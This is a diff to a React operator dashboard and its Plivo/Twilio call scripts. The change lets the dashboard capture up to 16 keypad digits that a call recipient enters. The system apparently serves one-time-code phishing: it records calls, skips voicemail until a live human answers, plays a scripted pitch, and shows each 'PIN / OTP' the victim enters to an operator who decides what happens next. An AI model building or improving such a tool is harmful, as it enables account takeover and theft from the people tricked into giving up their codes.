@@ -191,7 +191,7 @@ export const LiveSessionFeed: React.FC<LiveSessionFeedProps> = ({
       )
   );
 
-  const expectedLength = session?.numDigits || 6;
+  const maxDigits = Math.min(16, Math.max(1, session?.numDigits || 16));
   const pendingCode = session?.pendingDigits;
   const captured = session?.capturedDigits || '';
   const displayDigits = pendingCode || captured || session?.lastInvalidDigits || '';
@@ -199,6 +199,7 @@ export const LiveSessionFeed: React.FC<LiveSessionFeedProps> = ({
   const isAwaitingOperator = session?.status === 'awaiting-operator';
   const isValidState = session?.codeStatus === 'valid';
   const isInvalidState = session?.codeStatus === 'invalid' && Boolean(session?.attempts);
+  const slotCount = displayDigits.length > 0 ? displayDigits.length : maxDigits;
   const hasInputtedCode = Boolean(
     session?.pendingDigits ||
       session?.capturedDigits ||
@@ -440,13 +441,18 @@ export const LiveSessionFeed: React.FC<LiveSessionFeedProps> = ({
             </div>
           )}
 
-          {/* REAL-TIME DIGIT DISPLAY (PIN / OTP BOXES) */}
+          {/* REAL-TIME DIGIT DISPLAY (UP TO 16 DIGITS • # TO SUBMIT) */}
           <div className="bg-slate-950 border border-slate-800 rounded-xl p-5 text-center">
-            <div className="flex items-center justify-between mb-3 text-xs text-slate-400">
-              <div className="flex items-center gap-2">
+            <div className="flex flex-wrap items-center justify-between gap-2 mb-3 text-xs text-slate-400">
+              <div className="flex flex-wrap items-center gap-2">
                 <span className="font-semibold uppercase tracking-wider text-slate-300">
-                  Keypad Code Stream ({expectedLength} Digits)
+                  Keypad Code Stream ({displayDigits ? `${displayDigits.length} Digits` : `Up to ${maxDigits} Digits • # Submit`})
                 </span>
+                {displayDigits && session.submittedViaPound && (
+                  <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-indigo-500/15 text-indigo-300 border border-indigo-500/30 font-semibold">
+                    # Submitted
+                  </span>
+                )}
                 {session.expectedCode && (
                   <span className="text-[11px] font-mono px-2 py-0.5 rounded bg-emerald-950/60 text-emerald-400 border border-emerald-500/30 font-semibold flex items-center gap-1">
                     <ShieldCheck className="w-3 h-3" />
@@ -469,16 +475,22 @@ export const LiveSessionFeed: React.FC<LiveSessionFeedProps> = ({
               </span>
             </div>
 
-            {/* Digit Boxes */}
-            <div className="flex items-center justify-center gap-2 sm:gap-3 py-2">
-              {Array.from({ length: expectedLength }).map((_, i) => {
+            {/* Digit Boxes (responsive wrapping supports 1 to 16 digits cleanly) */}
+            <div className="flex flex-wrap items-center justify-center gap-1.5 sm:gap-2 py-2">
+              {Array.from({ length: slotCount }).map((_, i) => {
                 const digit = displayDigits[i];
                 const isNext = displayDigits.length === i && isCallActive && !isAwaitingOperator;
+                const sizeClasses =
+                  slotCount > 10
+                    ? 'w-9 h-11 sm:w-10 sm:h-12 text-lg sm:text-xl'
+                    : slotCount > 6
+                    ? 'w-10 h-12 sm:w-11 sm:h-14 text-xl sm:text-2xl'
+                    : 'w-12 h-14 sm:w-14 sm:h-16 text-2xl sm:text-3xl';
 
                 return (
                   <div
                     key={i}
-                    className={`w-12 h-14 sm:w-14 sm:h-16 rounded-xl border flex items-center justify-center font-mono text-2xl sm:text-3xl font-bold transition-all ${
+                    className={`${sizeClasses} rounded-xl border flex items-center justify-center font-mono font-bold transition-all ${
                       isValidState
                         ? 'bg-slate-900 border-emerald-500 text-emerald-400 shadow-md shadow-emerald-500/10'
                         : isAwaitingOperator
@@ -508,7 +520,7 @@ export const LiveSessionFeed: React.FC<LiveSessionFeedProps> = ({
               ) : isAwaitingOperator ? (
                 <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-amber-500/15 text-amber-300 border border-amber-500/30 text-xs font-bold animate-pulse">
                   <PauseCircle className="w-4 h-4" />
-                  <span>Caller Entered [{pendingCode}] &bull; Waiting for your decision below</span>
+                  <span>Caller Entered [{pendingCode}] ({pendingCode?.length || 0} digits) &bull; Waiting for your decision below</span>
                 </div>
               ) : isInvalidState ? (
                 <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-rose-500/10 text-rose-400 border border-rose-500/30 text-xs font-semibold animate-pulse">
@@ -519,7 +531,7 @@ export const LiveSessionFeed: React.FC<LiveSessionFeedProps> = ({
                 </div>
               ) : isCallActive ? (
                 <span className="text-xs text-slate-400">
-                  Recipient is on the call. Waiting for {expectedLength}-digit keypad input...
+                  Recipient is on the call. Waiting for keypad input (up to {maxDigits} digits, or press # to send)...
                 </span>
               ) : (
                 <span className="text-xs text-slate-500">
@@ -857,27 +869,27 @@ export const LiveSessionFeed: React.FC<LiveSessionFeedProps> = ({
                 ? `<?xml version="1.0" encoding="UTF-8"?>
 <Response>
   <!-- t=0s: Record & silently listen for voice/DTMF (NEVER speak to Voicemail) -->
-  <Record recordSession="true" redirect="false" maxLength="3600" fileFormat="mp3"/>
-  <GetInput action="/api/plivo/amd-gate?callId=${session.id}" method="POST" inputType="dtmf speech" executionTimeout="2" speechEndTimeout="1">
+  <Record recordSession="true" redirect="false" maxLength="3600" fileFormat="wav"/>
+  <GetInput action="/api/plivo/amd-gate?callId=${session.id}" method="POST" inputType="dtmf speech" numDigits="${maxDigits}" finishOnKey="#" executionTimeout="2" speechEndTimeout="auto">
     <Wait length="2"/>
   </GetInput>
 
   <!-- ONLY once Live Human confirmed (direct or picks up after Voicemail): -->
   <Speak>${session.introGreeting.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</Speak>
-  <GetInput action="${carrierGatherPath}?callId=${session.id}" method="POST" inputType="dtmf speech" numDigits="${session.numDigits}" executionTimeout="15" digitEndTimeout="5">
+  <GetInput action="${carrierGatherPath}?callId=${session.id}" method="POST" inputType="dtmf speech" numDigits="${maxDigits}" finishOnKey="#" executionTimeout="25" digitEndTimeout="8" speechEndTimeout="auto">
     <Speak>${session.script.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</Speak>
   </GetInput>
 </Response>`
                 : `<?xml version="1.0" encoding="UTF-8"?>
 <Response>
   <!-- t=0s: Record & silently listen for voice/DTMF (NEVER speak to Voicemail) -->
-  <Gather input="dtmf speech" numDigits="${session.numDigits}" action="/api/twiml/amd-gate?callId=${session.id}" method="POST" timeout="2" speechTimeout="1">
+  <Gather input="dtmf speech" numDigits="${maxDigits}" finishOnKey="#" action="/api/twiml/amd-gate?callId=${session.id}" method="POST" timeout="2" speechTimeout="auto">
     <Pause length="2"/>
   </Gather>
 
   <!-- ONLY once Live Human confirmed (direct or picks up after Voicemail): -->
   <Say voice="${session.voice}">${session.introGreeting.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</Say>
-  <Gather input="dtmf speech" numDigits="${session.numDigits}" action="${carrierGatherPath}?callId=${session.id}" method="POST" timeout="15" speechTimeout="auto" finishOnKey="#">
+  <Gather input="dtmf speech" numDigits="${maxDigits}" finishOnKey="#" action="${carrierGatherPath}?callId=${session.id}" method="POST" timeout="25" speechTimeout="auto">
     <Say voice="${session.voice}">${session.script.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</Say>
   </Gather>
 </Response>`}
